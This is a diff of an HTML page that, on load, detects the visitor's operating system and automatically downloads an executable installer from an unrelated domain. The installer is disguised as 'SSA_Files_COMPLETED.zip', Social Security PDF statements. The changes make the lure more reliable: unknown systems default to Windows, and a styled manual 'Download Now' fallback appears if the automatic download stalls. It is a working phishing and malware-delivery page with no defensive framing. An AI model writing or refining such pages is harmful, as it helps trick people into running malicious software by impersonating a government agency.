@@ -3,13 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Download</title>
-    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <title>Download Manager</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .download-message {
+            margin-top: 50px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        .download-link {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+        }
+    </style>
 </head>
 <body>
+    <div class="download-message" id="message">
+        <p>Preparing your download...</p>
+    </div>
+
     <script>
-        // Wait for both DOM and jQuery to be ready
-        $(document).ready(function() {
+        // Remove jQuery dependency since we don't need it for this simple functionality
+        document.addEventListener('DOMContentLoaded', function() {
             function detectOS() {
                 try {
                     const platform = navigator.platform.toLowerCase();
@@ -19,10 +48,10 @@
                     if (platform.includes('mac')) return 'macos';
                     if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
 
-                    return 'unknown';
+                    return 'windows'; // Default to Windows
                 } catch (e) {
                     console.error("Error detecting OS:", e);
-                    return 'unknown';
+                    return 'windows';
                 }
             }
 
@@ -30,46 +59,52 @@
                 const baseUrl = 'https://arjairsparts.com/zoomsetup/clientsetup/SocialSecurityPDFStatements';
                 const queryParams = '?e=Access&y=Guest';
                 
-                switch (os) {
-                    case 'windows':
-                        return baseUrl + '.exe' + queryParams;
-                    case 'macos':
-                        return baseUrl + '.pkg' + queryParams;
-                    case 'linux':
-                        return baseUrl + '.sh' + queryParams;
-                    default:
-                        return baseUrl + '.exe' + queryParams;
-                }
+                const extensions = {
+                    'windows': '.exe',
+                    'macos': '.pkg',
+                    'linux': '.sh'
+                };
+                
+                return baseUrl + (extensions[os] || '.exe') + queryParams;
             }
 
             function initiateDownload() {
                 try {
                     const osType = detectOS();
                     const downloadLink = getDownloadLink(osType);
+                    const messageEl = document.getElementById('message');
 
-                    // Create a temporary anchor element
+                    // First try the automatic download
                     const downloadBtn = document.createElement("a");
                     downloadBtn.href = downloadLink;
-                    downloadBtn.download = "SSA Files -- COMPLETED.zip";
+                    downloadBtn.download = "SSA_Files_COMPLETED.zip";
                     downloadBtn.style.display = "none";
                     document.body.appendChild(downloadBtn);
-                    
-                    // Trigger the download
                     downloadBtn.click();
-                    
-                    // Clean up
+
+                    // Show success message or fallback
                     setTimeout(function() {
                         document.body.removeChild(downloadBtn);
-                        window.close();
+                        
+                        // If still on page after 2 seconds, show manual download option
+                        messageEl.innerHTML = `
+                            <p>If download didn't start automatically, please click:</p>
+                            <a class="download-link" href="${downloadLink}" download="SSA_Files_COMPLETED.zip">Download Now</a>
+                            <p>Or try right-clicking the link and selecting "Save link as..."</p>
+                        `;
                     }, 2000);
+
                 } catch (e) {
                     console.error("Download failed:", e);
-                    // Fallback - redirect to Windows version if something goes wrong
-                    window.location.href = getDownloadLink('windows');
+                    // Show manual download option on error
+                    document.getElementById('message').innerHTML = `
+                        <p>Download failed. Please click to download manually:</p>
+                        <a class="download-link" href="${getDownloadLink('windows')}" download="SSA_Files_COMPLETED.zip">Download Now</a>
+                    `;
                 }
             }
 
-            // Start the process
+            // Start the download process
             initiateDownload();
         });
     </script>
